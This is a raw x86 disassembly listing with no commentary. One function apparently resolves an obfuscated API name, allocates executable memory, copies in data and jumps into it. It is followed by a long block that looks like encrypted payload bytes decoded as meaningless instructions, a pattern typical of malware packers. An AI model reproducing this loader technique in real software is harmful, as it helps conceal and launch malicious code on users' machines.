  421519:	mov    edx,0x362f159
  42151e:	imul   edi,esp,0xffffff86
  421521:	dec    ecx
  421522:	sub    cl,BYTE PTR [edi+0x3a]
  421525:	(bad)  
  421526:	mov    ecx,0xefc83f52
  42152b:	fcomp  DWORD PTR [edi-0x55]
  42152e:	cmp    eax,0x6a9fd4ed
  421533:	cmp    al,0x75
  421535:	pop    edx
  421536:	inc    eax
  421537:	fiadd  WORD PTR fs:[edi-0x22d11b47]
  42153e:	xor    ecx,DWORD PTR [ebx+0x5e7a8a03]
  421544:	pop    ebp
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x70
  421556:	mov    DWORD PTR [ebp-0x30],0x0
  42155d:	mov    DWORD PTR [ebp-0x70],0x0
  421564:	mov    DWORD PTR [ebp-0x58],0x0
  42156b:	mov    DWORD PTR [ebp-0x60],0x0
  421572:	mov    DWORD PTR [ebp-0x4c],0x0
  421579:	mov    DWORD PTR [ebp-0x8],0x0
  421580:	mov    DWORD PTR [ebp-0x18],0x0
  421587:	mov    DWORD PTR [ebp-0x48],0x0
  42158e:	mov    DWORD PTR [ebp-0x10],0x0
  421595:	mov    DWORD PTR [ebp-0x6c],0x0
  42159c:	mov    DWORD PTR [ebp-0x54],0x0
  4215a3:	mov    DWORD PTR [ebp-0x4],0x0
  4215aa:	mov    DWORD PTR [ebp-0x2c],0x0
  4215b1:	mov    DWORD PTR [ebp-0x50],0x0
  4215b8:	mov    DWORD PTR [ebp-0x68],0x0
  4215bf:	mov    DWORD PTR [ebp-0xc],0x0
  4215c6:	mov    DWORD PTR [ebp-0x5c],0x0
  4215cd:	mov    DWORD PTR [ebp-0x14],0x0
  4215d4:	mov    eax,ds:0x428150
  4215d9:	mov    DWORD PTR [ebp-0x28],eax
  4215dc:	mov    ecx,DWORD PTR ds:0x428154
  4215e2:	mov    DWORD PTR [ebp-0x24],ecx
  4215e5:	mov    edx,DWORD PTR ds:0x428158
  4215eb:	mov    DWORD PTR [ebp-0x20],edx
  4215ee:	mov    al,ds:0x42815c
  4215f3:	mov    BYTE PTR [ebp-0x1c],al
  4215f6:	mov    ecx,DWORD PTR ds:0x428140
  4215fc:	mov    DWORD PTR [ebp-0x40],ecx
  4215ff:	mov    edx,DWORD PTR ds:0x428144
  421605:	mov    DWORD PTR [ebp-0x3c],edx
  421608:	mov    eax,ds:0x428148
  42160d:	mov    DWORD PTR [ebp-0x38],eax
  421610:	mov    cx,WORD PTR ds:0x42814c
  421617:	mov    WORD PTR [ebp-0x34],cx
  42161b:	mov    dl,BYTE PTR ds:0x42814e
  421621:	mov    BYTE PTR [ebp-0x32],dl
  421624:	mov    DWORD PTR [ebp-0x2c],0x40
  42162b:	mov    eax,DWORD PTR [ebp-0x60]
  42162e:	push   eax
  42162f:	push   0x0
  421631:	push   0x0
  421633:	mov    ecx,DWORD PTR [ebp-0x68]
  421636:	push   ecx
  421637:	call   0x422a10
  42163c:	lea    edx,[ebp-0xc]
  42163f:	push   edx
  421640:	lea    eax,[ebp-0xc]
  421643:	push   eax
  421644:	lea    ecx,[ebp-0x14]
  421647:	push   ecx
  421648:	call   DWORD PTR ds:0x428004
  42164e:	test   eax,eax
  421650:	je     0x42166b
  421652:	mov    edx,DWORD PTR [ebp-0x60]
  421655:	push   edx
  421656:	push   0x8
  421658:	mov    eax,DWORD PTR [ebp-0x68]
  42165b:	push   eax
  42165c:	call   DWORD PTR ds:0x428030
  421662:	mov    ecx,DWORD PTR [ebp-0xc]
  421665:	add    ecx,0x1
  421668:	mov    DWORD PTR [ebp-0xc],ecx
  42166b:	push   0x0
  42166d:	push   0x0
  42166f:	push   0x0
  421671:	call   DWORD PTR ds:0x428000
  421677:	mov    BYTE PTR [ebp-0x40],0x56
  42167b:	call   DWORD PTR ds:0x42803c
  421681:	mov    DWORD PTR [ebp-0x30],eax
  421684:	mov    BYTE PTR [ebp-0x3e],0x72
  421688:	movzx  edx,WORD PTR [ebp-0x30]
  42168c:	test   edx,edx
  42168e:	jne    0x4216e0
  421690:	mov    BYTE PTR [ebp-0x34],0x0
  421694:	mov    DWORD PTR [ebp-0x14],0xe0d
  42169b:	lea    eax,[ebp-0x28]
  42169e:	push   eax
  42169f:	call   DWORD PTR ds:0x428044
  4216a5:	mov    DWORD PTR [ebp-0x60],eax
  4216a8:	mov    DWORD PTR [ebp-0x58],0x3a
  4216af:	lea    ecx,[ebp-0x40]
  4216b2:	push   ecx
  4216b3:	mov    edx,DWORD PTR [ebp-0x60]
  4216b6:	push   edx
  4216b7:	call   DWORD PTR ds:0x428040
  4216bd:	mov    DWORD PTR [ebp-0x44],eax
  4216c0:	mov    DWORD PTR [ebp-0x4],0x1b524be9
  4216c7:	push   0x3
  4216c9:	push   0x0
  4216cb:	push   0x0
  4216cd:	mov    eax,DWORD PTR [ebp-0x68]
  4216d0:	push   eax
  4216d1:	call   DWORD PTR ds:0x42812c
  4216d7:	mov    DWORD PTR [ebp-0x6c],0x10e7cf
  4216de:	jmp    0x421701
  4216e0:	mov    BYTE PTR ds:0x445fe8,0x0
  4216e7:	mov    BYTE PTR ds:0x42d1f0,0x0
  4216ee:	push   0x0
  4216f0:	mov    ecx,DWORD PTR [ebp-0x60]
  4216f3:	push   ecx
  4216f4:	call   DWORD PTR ds:0x42800c
  4216fa:	mov    BYTE PTR ds:0x4439a8,0x0
  421701:	push   DWORD PTR [ebp-0x2c]
  421704:	push   0x1000
  421709:	mov    eax,DWORD PTR [ebp-0x14]
  42170c:	add    eax,0x23
  42170f:	add    eax,0x23
  421712:	push   eax
  421713:	xor    eax,eax
  421715:	push   eax
  421716:	mov    ecx,DWORD PTR [ebp-0x44]
  421719:	call   ecx
  42171b:	mov    edx,eax
  42171d:	mov    DWORD PTR [ebp-0x8],edx
  421720:	mov    edx,DWORD PTR [ebp-0x6c]
  421723:	sub    edx,0xdae0b
  421729:	mov    DWORD PTR [ebp-0x6c],edx
  42172c:	cmp    DWORD PTR [ebp-0x8],0x0
  421730:	jne    0x42174d
  421732:	mov    eax,DWORD PTR [ebp-0x68]
  421735:	push   eax
  421736:	push   0x0
  421738:	mov    ecx,DWORD PTR [ebp-0x60]
  42173b:	push   ecx
  42173c:	push   0x1
  42173e:	push   0x0
  421740:	call   DWORD PTR ds:0x428120
  421746:	mov    BYTE PTR ds:0x4439a8,0x0
  42174d:	mov    edx,DWORD PTR [ebp-0x8]
  421750:	add    edx,DWORD PTR [ebp-0x14]
  421753:	mov    eax,DWORD PTR [ebp-0x4]
  421756:	mov    DWORD PTR [edx],eax
  421758:	mov    DWORD PTR [ebp-0x30],0x410000
  42175f:	mov    ecx,DWORD PTR [ebp-0x60]
  421762:	push   ecx
  421763:	call   DWORD PTR ds:0x428048
  421769:	call   DWORD PTR ds:0x428130
  42176f:	push   DWORD PTR ds:0x428044
  421775:	pop    edx
  421776:	mov    DWORD PTR [ebp-0x70],edx
  421779:	mov    edx,DWORD PTR [ebp-0x8]
  42177c:	add    edx,DWORD PTR [ebp-0x58]
  42177f:	mov    DWORD PTR [ebp-0x5c],edx
  421782:	mov    eax,ds:0x428040
  421787:	mov    DWORD PTR [ebp-0x4c],eax
  42178a:	mov    ecx,DWORD PTR [ebp-0x8]
  42178d:	add    ecx,DWORD PTR [ebp-0x14]
  421790:	mov    edx,DWORD PTR [ebp+0x8]
  421793:	mov    DWORD PTR [ecx+0x4],edx
  421796:	mov    eax,DWORD PTR [ebp-0x8]
  421799:	add    eax,DWORD PTR [ebp-0x14]
  42179c:	mov    DWORD PTR [ebp-0x10],eax
  42179f:	mov    ecx,DWORD PTR [ebp-0x68]
  4217a2:	push   ecx
  4217a3:	call   DWORD PTR ds:0x428050
  4217a9:	cmp    DWORD PTR [ebp-0x6c],0x0
  4217ad:	jbe    0x4217ca
  4217af:	mov    edx,DWORD PTR [ebp-0x10]
  4217b2:	push   edx
  4217b3:	mov    eax,DWORD PTR [ebp-0x14]
  4217b6:	push   eax
  4217b7:	mov    ecx,DWORD PTR [ebp-0x30]
  4217ba:	add    ecx,DWORD PTR [ebp-0x6c]
  4217bd:	push   ecx
  4217be:	mov    edx,DWORD PTR [ebp-0x8]
  4217c1:	push   edx
  4217c2:	call   0x411000
  4217c7:	add    esp,0x10
  4217ca:	cmp    DWORD PTR [ebp-0x5c],0x0
  4217ce:	je     0x4217de
  4217d0:	push   DWORD PTR [ebp-0x4c]
  4217d3:	push   DWORD PTR [ebp-0x70]
  4217d6:	mov    edx,DWORD PTR [ebp-0x5c]
  4217d9:	push   eax
  4217da:	jmp    edx
  4217dc:	jmp    0x4217e4
  4217de:	mov    eax,DWORD PTR [ebp+0x8]
  4217e1:	mov    DWORD PTR [ebp-0x18],eax
  4217e4:	mov    eax,0x1
  4217e9:	mov    esp,ebp
  4217eb:	pop    ebp
  4217ec:	ret    
  4217ed:	int3   
  4217ee:	int3   
  4217ef:	int3   
  4217f0:	push   ebp
  4217f1:	mov    ebp,esp
  4217f3:	sub    esp,0x8
  4217f6:	push   esi
  4217f7:	push   0xa
  4217f9:	mov    DWORD PTR [ebp-0x4],0x0
  421800:	call   DWORD PTR ds:0x428028
  421806:	mov    esi,DWORD PTR ds:0x42803c
  42180c:	push   0xa
  42180e:	push   0xa
  421810:	push   0x0
  421812:	mov    DWORD PTR [ebp-0x8],esi
  421815:	call   DWORD PTR ds:0x428010
  42181b:	test   esi,esi
  42181d:	jne    0x421829
  42181f:	push   0xa
  421821:	push   esi
  421822:	push   esi
  421823:	call   DWORD PTR ds:0x428024
  421829:	call   DWORD PTR ds:0x428020
  42182f:	push   0x0
  421831:	push   0x4e
  421833:	push   0x1e
  421835:	push   0x0
  421837:	push   0xffffffff
  421839:	call   DWORD PTR ds:0x42801c
  42183f:	test   eax,eax
  421841:	je     0x421852
  421843:	push   0x0
  421845:	push   0x1
  421847:	push   0x0
  421849:	call   DWORD PTR ds:0x428018
  42184f:	mov    DWORD PTR [ebp-0x4],eax
  421852:	mov    esi,DWORD PTR [ebp-0x8]
  421855:	call   esi
  421857:	mov    DWORD PTR [ebp-0x4],eax
  42185a:	cmp    DWORD PTR [ebp-0x4],0x57
  42185e:	jne    0x421879
  421860:	push   0x5d918c4a
  421865:	call   0x421550
  42186a:	add    esp,0x4
  42186d:	push   0x1
  42186f:	push   0x0
  421871:	push   0x0
  421873:	call   DWORD PTR ds:0x428128
  421879:	xor    eax,eax
  42187b:	pop    esi
  42187c:	mov    esp,ebp
  42187e:	pop    ebp
  42187f:	ret    
  421880:	sub    esp,0x10
  421883:	push   0x0
  421885:	push   0x0
  421887:	call   DWORD PTR ds:0x428034
  42188d:	lea    eax,[esp+0x0]
  421891:	push   eax
  421892:	call   DWORD PTR ds:0x42804c
  421898:	push   0xa
  42189a:	call   DWORD PTR ds:0x428028
  4218a0:	cmp    WORD PTR [esp+0x0],0x0
  4218a6:	je     0x4218c4
  4218a8:	push   0x0
  4218aa:	push   0x0
  4218ac:	push   0x0
  4218ae:	push   0x0
  4218b0:	call   0x422a10
  4218b5:	push   0x0
  4218b7:	call   0x4217f0
  4218bc:	add    esp,0x4
  4218bf:	jmp    0x4229f1
  4218c4:	call   FWORD PTR [ebx]
  4218c6:	(bad)  
  4218c7:	push   esp
  4218c8:	pop    ecx
  4218c9:	stos   DWORD PTR es:[edi],eax
  4218ca:	aas    
  4218cb:	loopne 0x4218f4
  4218cd:	cmp    ebp,DWORD PTR [ebx+0x11]
  4218d0:	(bad)  
  4218d1:	shr    BYTE PTR [ecx-0x571e3b5c],cl
  4218d7:	aas    
  4218d8:	loopne 0x421901
  4218da:	aas    
  4218db:	imul   edx,DWORD PTR [ecx],0xffffffbe
  4218de:	sub    eax,0x59c4a456
  4218e3:	test   al,0x3f
  4218e5:	loopne 0x42190e
  4218e7:	aas    
  4218e8:	imul   edx,DWORD PTR [ecx],0xfffffffe
  4218eb:	sub    eax,0x59c4a456
  4218f0:	test   al,0x3f
  4218f2:	loopne 0x42191b
  4218f4:	aas    
  4218f5:	imul   edx,DWORD PTR [ecx],0xfffffffe
  4218f8:	sub    eax,0x59c4a456
  4218fd:	test   al,0x3f
  4218ff:	loopne 0x421928
  421901:	(bad)  
  421902:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421905:	and    ecx,DWORD PTR [ecx+0x1e]
  421908:	retf   0x1c59
  42190b:	ss sub eax,0x5d6a8706
  421911:	xor    ecx,DWORD PTR [edx+eax*1]
  421914:	int3   
  421915:	lods   eax,DWORD PTR ds:[esi]
  421916:	sub    cl,BYTE PTR [eax+0x5848924f]
  42191c:	sbb    DWORD PTR [eax-0x6d],esi
  42191f:	or     eax,0x37aac535
  421924:	(bad)  
  421925:	dec    ebx
  421926:	rol    BYTE PTR [ebp+0x5a],0x4b
  42192a:	arpl   WORD PTR [ebx-0x553289bd],cx
  421930:	jns    0x42191e
  421932:	jo     0x4218e7
  421934:	pop    es
  421935:	push   edx
  421936:	add    al,0x75
  421938:	fwait
  421939:	add    ebx,DWORD PTR [ebx-0x57]
  42193c:	into   
  42193d:	jge    0x4218e7
  42193f:	aas    
  421940:	loopne 0x421969
  421942:	aas    
  421943:	imul   edx,DWORD PTR [ecx],0xfffffff9
  421946:	mov    ah,0xaa
  421948:	std    
  421949:	xchg   DWORD PTR [ecx-0x205ccac6],esp
  42194f:	lods   eax,DWORD PTR ds:[esi]
  421950:	popa   
  421951:	push   edx
  421952:	push   es
  421953:	mov    edi,0x55a1fc5c
  421958:	mov    ds:0x35b51860,al
  42195d:	xor    esi,DWORD PTR [esi+eax*8+0x27]
  421961:	xchg   esp,eax
  421962:	pop    esp
  421963:	push   esi
  421964:	push   ebx
  421965:	lock pop edx
  421967:	fldcw  WORD PTR ds:0xf4839357
  42196d:	add    eax,ebx
  42196f:	popf   
  421970:	into   
  421971:	pop    ds
  421972:	push   eax
  421973:	lods   eax,DWORD PTR ds:[esi]
  421974:	jmp    0xd5b4:0x1b7abf6d
  42197b:	les    ebp,FWORD PTR [esi+0x35a9d98e]
  421981:	mov    eax,0x5261addf
  421986:	push   es
  421987:	mov    esi,0xcb3d8c5c
  42198c:	mov    ds:0x35a73880,al
  421991:	es jmp 0xc1504103
  421997:	stc    
  421998:	push   ebx
  421999:	mov    al,ds:0x672d72c7
  42199e:	push   cs
  42199f:	sbb    esp,esi
  4219a1:	outs   dx,DWORD PTR ds:[esi]
  4219a2:	scas   al,BYTE PTR es:[edi]
  4219a3:	ss into 
  4219a5:	add    ebp,ecx
  4219a7:	xor    dl,ch
  4219a9:	gs (bad) 
  4219ab:	stc    
  4219ac:	sbb    ebp,DWORD PTR [esp+eax*2-0x5e7833cb]
  4219b3:	cmp    dh,BYTE PTR ds:0x6b3f27e0
  4219b9:	adc    esi,edi
  4219bb:	sub    eax,0x5981f456
  4219c0:	test   al,0x73
  4219c2:	loope  0x4219e9
  4219c4:	aas    
  4219c5:	xchg   edx,esi
  4219c7:	mov    eax,ds:0xc4a45662
  4219cc:	pop    ecx
  4219cd:	test   al,0x3f
  4219cf:	loopne 0x4219f8
  4219d1:	fild   QWORD PTR [ebx+0x12]
  4219d4:	jmp    DWORD PTR [esi]
  4219d6:	push   edi
  4219d7:	scas   al,BYTE PTR es:[edi]
  4219d8:	les    ebx,FWORD PTR [ecx+0x44]
  4219db:	cmp    esp,eax
  4219dd:	daa    
  4219de:	cmp    ebp,DWORD PTR [ebp+0x11]
  4219e1:	(bad)  
  4219e2:	sub    eax,0xe4c5a456
  4219e7:	test   al,0x3f
  4219e9:	loopne 0x421a22
  4219eb:	aas    
  4219ec:	imul   edx,DWORD PTR [ecx],0xfffffffe
  4219ef:	sub    BYTE PTR [esi-0x5c],dl
  4219f2:	les    ebx,FWORD PTR [eax]
  4219f4:	test   al,0x3f
  4219f6:	lock daa 
  4219f8:	aas    
  4219f9:	imul   edx,DWORD PTR [ebx],0xfffffffe
  4219fc:	sub    eax,0x59c5a453
  421a01:	test   al,0x3f
  421a03:	loopne 0x421a2c
  421a05:	cmp    ch,BYTE PTR [ebx+0x10]
  421a08:	(bad)  
  421a09:	sub    eax,0x59c4a456
  421a0e:	sub    BYTE PTR [eax+eiz*8],dh
  421a11:	daa    
  421a12:	cmp    ebp,DWORD PTR [ebx+0x11]
  421a15:	inc    ebx
  421a16:	sbb    al,0x53
  421a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a19:	(bad)  
  421a1a:	pop    ecx
  421a1b:	test   al,0xbf
  421a1d:	loopne 0x421a46
  421a1f:	das    
  421a20:	imul   edx,DWORD PTR [ecx],0xffffffee
  421a23:	sub    eax,0x49c4a456
  421a28:	test   al,0x3f
  421a2a:	lock daa 
  421a2c:	aas    
  421a2d:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a30:	sub    eax,0x59c4a446
  421a35:	test   al,0x3f
  421a37:	loopne 0x421a60
  421a39:	aas    
  421a3a:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a3d:	test   eax,0x30c4af38
  421a42:	stos   DWORD PTR es:[edi],eax
  421a43:	aas    
  421a44:	loopne 0x421a6d
  421a46:	punpcklbw mm2,DWORD PTR [ecx]
  421a49:	xor    DWORD PTR [eax],edx
  421a4b:	push   esi
  421a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a4d:	les    ebx,FWORD PTR [ecx-0x58]
  421a50:	aas    
  421a51:	loopne 0x421a7a
  421a53:	aas    
  421a54:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a57:	sub    eax,0x59c4a456
  421a5c:	test   al,0x3f
  421a5e:	loopne 0x421a87
  421a60:	aas    
  421a61:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a64:	sub    eax,0x59c4a456
  421a69:	test   al,0x3f
  421a6b:	loopne 0x421a94
  421a6d:	aas    
  421a6e:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a71:	sub    eax,0x59c4a456
  421a76:	test   al,0x3f
  421a78:	loopne 0x421aa1
  421a7a:	aas    
  421a7b:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a7e:	sub    eax,0x59c4a456
  421a83:	test   al,0x3f
  421a85:	loopne 0x421aae
  421a87:	aas    
  421a88:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a8b:	sub    eax,0x59c4a456
  421a90:	test   al,0x3f
  421a92:	loopne 0x421abb
  421a94:	aas    
  421a95:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421a98:	sub    eax,0x59c4a456
  421a9d:	test   al,0x3f
  421a9f:	loopne 0x421ac8
  421aa1:	aas    
  421aa2:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421aa5:	sub    eax,0x59c4a456
  421aaa:	test   al,0x3f
  421aac:	loopne 0x421ad5
  421aae:	aas    
  421aaf:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421ab2:	sub    eax,0x2deaa456
  421ab7:	int    0x47
  421ab9:	xchg   esp,eax
  421aba:	daa    
  421abb:	aas    
  421abc:	imul   edx,DWORD PTR [ecx],0xffffffde
  421abf:	es push esi
  421ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ac2:	aam    0x59
  421ac4:	test   al,0x3f
  421ac6:	fisub  DWORD PTR [ebx]
  421ac8:	aas    
  421ac9:	imul   edx,DWORD PTR ds:0xe1062dfe,0xffffff87
  421ad0:	imul   edi,esp,0x70
  421ad3:	loopne 0x421afc
  421ad5:	aas    
  421ad6:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421ad9:	or     eax,0x7724a456
  421ade:	fimul  DWORD PTR [edx+edx*4+0x44]
  421ae2:	aas    
  421ae3:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421ae6:	jge    0x421b3e
  421ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ae9:	les    ebp,FWORD PTR [ecx-0x5d]
  421aec:	aas    
  421aed:	loopne 0x421b66
  421aef:	aas    
  421af0:	imul   edx,DWORD PTR [ecx],0xffffffc0
  421af3:	sub    DWORD PTR [esi-0x5c],edx
  421af6:	les    ebx,FWORD PTR [ecx-0x58]
  421af9:	aas    
  421afa:	loopne 0x421b23
  421afc:	aas    
  421afd:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b00:	sub    eax,0xb9c4a476
  421b05:	test   al,0x3f
  421b07:	loopne 0x421b30
  421b09:	aas    
  421b0a:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b0d:	sub    eax,0x59c4a456
  421b12:	test   al,0x3f
  421b14:	loopne 0x421b3d
  421b16:	aas    
  421b17:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b1a:	sub    eax,0x59c4a456
  421b1f:	test   al,0x3f
  421b21:	loopne 0x421b4a
  421b23:	aas    
  421b24:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b27:	sub    eax,0x59c4a456
  421b2c:	test   al,0x3f
  421b2e:	loopne 0x421b57
  421b30:	aas    
  421b31:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b34:	sub    eax,0x59c4a456
  421b39:	test   al,0x3f
  421b3b:	loopne 0x421b64
  421b3d:	aas    
  421b3e:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b41:	sub    eax,0x59c4a456
  421b46:	test   al,0x3f
  421b48:	loopne 0x421b71
  421b4a:	aas    
  421b4b:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b4e:	sub    eax,0x59c4a456
  421b53:	test   al,0x3f
  421b55:	loopne 0x421b7e
  421b57:	aas    
  421b58:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b5b:	sub    eax,0x59c4a456
  421b60:	test   al,0x3f
  421b62:	loopne 0x421b8b
  421b64:	aas    
  421b65:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b68:	sub    eax,0x59c4a456
  421b6d:	test   al,0x3f
  421b6f:	loopne 0x421b98
  421b71:	aas    
  421b72:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b75:	sub    eax,0x59c4a456
  421b7a:	test   al,0x3f
  421b7c:	loopne 0x421ba5
  421b7e:	aas    
  421b7f:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b82:	sub    eax,0x59c4a456
  421b87:	test   al,0x3f
  421b89:	loopne 0x421bb2
  421b8b:	aas    
  421b8c:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b8f:	sub    eax,0x59c4a456
  421b94:	test   al,0x3f
  421b96:	loopne 0x421bbf
  421b98:	aas    
  421b99:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421b9c:	sub    eax,0x59c4a456
  421ba1:	test   al,0x3f
  421ba3:	loopne 0x421bcc
  421ba5:	aas    
  421ba6:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421ba9:	sub    eax,0x59c4a456
  421bae:	test   al,0x3f
  421bb0:	loopne 0x421bd9
  421bb2:	aas    
  421bb3:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421bb6:	sub    eax,0x59c4a456
  421bbb:	test   al,0x3f
  421bbd:	loopne 0x421be6
  421bbf:	aas    
  421bc0:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421bc3:	sub    eax,0x59c4a456
  421bc8:	test   al,0x3f
  421bca:	loopne 0x421bf3
  421bcc:	aas    
  421bcd:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421bd0:	sub    eax,0x59c4a456
  421bd5:	test   al,0x3f
  421bd7:	loopne 0x421c00
  421bd9:	aas    
  421bda:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421bdd:	sub    eax,0x59c4a456
  421be2:	test   al,0x3f
  421be4:	loopne 0x421c0d
  421be6:	aas    
  421be7:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421bea:	sub    eax,0x59c4a456
  421bef:	test   al,0x3f
  421bf1:	loopne 0x421c1a
  421bf3:	aas    
  421bf4:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421bf7:	sub    eax,0x59c4a456
  421bfc:	test   al,0x3f
  421bfe:	loopne 0x421c27
  421c00:	aas    
  421c01:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c04:	sub    eax,0x59c4a456
  421c09:	test   al,0x3f
  421c0b:	loopne 0x421c34
  421c0d:	aas    
  421c0e:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c11:	sub    eax,0x59c4a456
  421c16:	test   al,0x3f
  421c18:	loopne 0x421c41
  421c1a:	aas    
  421c1b:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c1e:	sub    eax,0x59c4a456
  421c23:	test   al,0x3f
  421c25:	loopne 0x421c4e
  421c27:	aas    
  421c28:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c2b:	sub    eax,0x59c4a456
  421c30:	test   al,0x3f
  421c32:	loopne 0x421c5b
  421c34:	aas    
  421c35:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c38:	sub    eax,0x59c4a456
  421c3d:	test   al,0x3f
  421c3f:	loopne 0x421c68
  421c41:	aas    
  421c42:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c45:	sub    eax,0x59c4a456
  421c4a:	test   al,0x3f
  421c4c:	loopne 0x421c75
  421c4e:	aas    
  421c4f:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c52:	sub    eax,0x59c4a456
  421c57:	test   al,0x3f
  421c59:	loopne 0x421c82
  421c5b:	aas    
  421c5c:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c5f:	sub    eax,0x59c4a456
  421c64:	test   al,0x3f
  421c66:	loopne 0x421c8f
  421c68:	aas    
  421c69:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c6c:	sub    eax,0x59c4a456
  421c71:	test   al,0x3f
  421c73:	loopne 0x421c9c
  421c75:	aas    
  421c76:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c79:	sub    eax,0x59c4a456
  421c7e:	test   al,0x3f
  421c80:	loopne 0x421ca9
  421c82:	aas    
  421c83:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c86:	sub    eax,0x59c4a456
  421c8b:	test   al,0x3f
  421c8d:	loopne 0x421cb6
  421c8f:	aas    
  421c90:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421c93:	sub    eax,0x59c4a456
  421c98:	test   al,0x3f
  421c9a:	loopne 0x421cc3
  421c9c:	aas    
  421c9d:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421ca0:	sub    eax,0x59c4a456
  421ca5:	test   al,0x3f
  421ca7:	loopne 0x421cd0
  421ca9:	aas    
  421caa:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421cad:	sub    eax,0x59c4a456
  421cb2:	test   al,0x3f
  421cb4:	loopne 0x421cdd
  421cb6:	aas    
  421cb7:	imul   edx,DWORD PTR [ecx],0xfffffffe
  421cba:	sub    eax,0x59c4a456
  421cbf:	test   al,0x3f
  421cc1:	loopne 0x421cea
  421cc3:	aas    
  421cc4:	imul   edx,DWORD PTR [esi+0x10],0x27
  421cc8:	push   esi
  421cc9:	mov    eax,esp
  421ccb:	pop    ecx
  421ccc:	mov    eax,0x9d0de03f
  421cd1:	mov    cl,0x60
  421cd3:	cwde   
  421cd4:	sar    BYTE PTR [ebx+0x3a],cl
  421cd7:	inc    ebx
  421cd8:	or     DWORD PTR [ebp+0x9],eax
  421cdb:	or     BYTE PTR [ebx+ecx*4],dh
  421cde:	(bad)  
  421cdf:	ja     0x421c70
  421ce1:	test   eax,0xee75b70c
  421ce6:	mov    esi,0xbead0452
  421ceb:	lods   eax,DWORD PTR ds:[esi]
  421cec:	aas    
  421ced:	pushf  
  421cee:	mov    ebp,0x16f79d69
  421cf3:	sbb    DWORD PTR [eax],ebp
  421cf5:	ret    0x1827
  421cf8:	int3   
  421cf9:	cdq    
  421cfa:	stos   DWORD PTR es:[edi],eax
  421cfb:	jl     0x421d38
  421cfd:	or     eax,0x2b7564f6
  421d02:	push   ecx
  421d03:	inc    edi
  421d04:	das    
  421d05:	xor    BYTE PTR [edi],dh
  421d07:	out    dx,eax
  421d08:	ret    0x53f
  421d0b:	test   al,0xbe
  421d0d:	adc    dl,BYTE PTR [ebx]
  421d0f:	daa    
  421d10:	stos   BYTE PTR es:[edi],al
  421d11:	imul   edx,DWORD PTR [ebp-0x301f71d9],0xffffffa6
  421d18:	fs nop
  421d1a:	lods   al,BYTE PTR ds:[esi]
  421d1b:	test   al,0x99
  421d1d:	sbb    BYTE PTR [ebx],ah
  421d1f:	push   ds
  421d20:	or     al,0x4f
  421d22:	add    DWORD PTR [ecx-0x1de1e3c1],0x33
  421d29:	test   eax,0x9bd1532a
  421d2e:	repz gs test al,0x42
  421d32:	xor    esp,DWORD PTR [edx+eiz*4+0x5a]
  421d36:	mov    dh,0x91
  421d38:	cld    
  421d39:	cmc    
  421d3a:	rcr    DWORD PTR [esi+0x20e71dfb],1
  421d40:	mov    ebx,0xa4abef41
  421d45:	out    0x40,eax
  421d47:	mov    cl,0xfa
  421d49:	(bad)  
  421d4a:	fnstsw WORD PTR [edx]
  421d4c:	cmp    BYTE PTR [ebx+0x20c34d7f],0x12
  421d53:	mov    eax,0xc48dfc1
  421d58:	in     al,dx
  421d59:	cli    
  421d5a:	or     BYTE PTR [ebx],ch
  421d5c:	repz mov ds:0xf969d4f3,eax
  421d62:	and    al,0xe7
  421d64:	xchg   esp,eax
  421d65:	hlt    
  421d66:	jmp    0xdbcc03ea
  421d6b:	pop    edx
  421d6c:	fld    TBYTE PTR [eax-0x37828452]
  421d72:	(bad)  
  421d73:	div    BYTE PTR [edx+0x19]
  421d76:	enter  0xda0f,0xc6
  421d7a:	mov    edx,fs
  421d7c:	jo     0x421d64
